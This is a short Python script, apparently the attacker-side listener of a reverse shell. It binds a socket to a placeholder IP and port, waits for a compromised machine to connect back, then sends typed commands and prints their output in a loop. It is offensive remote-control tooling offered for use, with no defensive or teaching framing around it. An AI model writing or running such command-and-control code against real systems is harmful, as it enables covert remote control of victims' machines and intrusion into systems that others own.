#!/usr/bin/env python

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("YOUR_IP", PORT))
listener.listen(0)
print("[-] Waiting for incoming connections")
con, address = listener.accept()
print(f"[+] Connected with {str(address[0])}")


while True:
    command = input(">> ")
    con.send(command.encode())
    result = con.recv(1024).decode()
    print(result)
